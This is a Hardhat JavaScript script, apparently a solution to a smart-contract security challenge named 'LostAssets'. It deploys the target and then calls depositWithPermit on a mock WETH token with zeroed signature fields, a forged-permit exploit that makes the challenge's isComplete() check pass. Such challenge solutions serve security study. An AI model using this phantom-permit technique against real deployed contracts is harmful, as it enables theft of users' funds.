const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");

async function deploy(deployer) {
  const LostAssets = await ethers.getContractFactory("LostAssets", deployer);
  const oneEther = ethers.utils.parseEther("1");
  const lostAssets = await LostAssets.deploy({ value: oneEther });
  console.log("LostAssets contract:", lostAssets.address);

  return lostAssets;
}

async function exploit(target, attacker) {
  try {
    await target.connect(attacker).isComplete();
  } catch (error) {
    console.log("Before: isComplete():", error.toString());
  }
  const MocksWETH = await ethers.getContractFactory("MocksWETH");
  const mocksWETH = await MocksWETH.attach(await target.sWETH());

  await mocksWETH
    .connect(attacker)
    .depositWithPermit(
      target.address,
      BigNumber.from("500000000000000000"),
      0x0000000000000000000000000000000000000000000000000000000000000000,
      0x1,
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      attacker.address
    );
  console.log(
    "After: isComplete():",
    await target.connect(attacker).isComplete()
  );
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let lostAssets = await deploy(deployer);

  await exploit(lostAssets, attacker);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
